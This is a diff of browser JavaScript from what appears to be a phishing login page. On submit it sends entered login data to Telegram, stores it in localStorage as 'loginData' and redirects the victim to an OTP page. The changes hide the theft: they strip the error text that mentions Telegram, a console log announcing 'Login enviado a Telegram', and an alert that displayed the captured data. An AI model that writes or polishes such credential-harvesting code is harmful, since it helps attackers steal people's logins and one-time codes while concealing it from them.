@@ -72,7 +72,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
       );
 
-      if (!response.ok) throw new Error("Error al enviar a Telegram");
+      if (!response.ok) throw new Error("Error al enviar  T");
 
       /* =============================== GUARDAR EN LOCALSTORAGE =============================== */
       const datosLogin = {
@@ -84,7 +84,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
       localStorage.setItem("loginData", JSON.stringify(datosLogin));
 
-      console.log("Login enviado a Telegram y guardado:", datosLogin);
 
       /* =============================== ALERTA DE PRUEBA =============================== */
       const primerFormulario = JSON.parse(localStorage.getItem("registros"));
@@ -113,16 +112,17 @@ document.addEventListener("DOMContentLoaded", () => {
           "🕒 Fecha: " + segundoFormulario.fecha;
       }
 
-      alert(mensajeForm1 + "\n\n" + mensajeForm2);
+    
 
       /* =============================== REDIRECCIÓN =============================== */
       window.location.href = "otp.html";
 
     } catch (error) {
       console.error("Telegram error:", error);
-      alert("Error al enviar los datos. Intenta nuevamente.");
+      alert("Error. Intenta nuevamente.");
     }
 
   });
+
 
 });
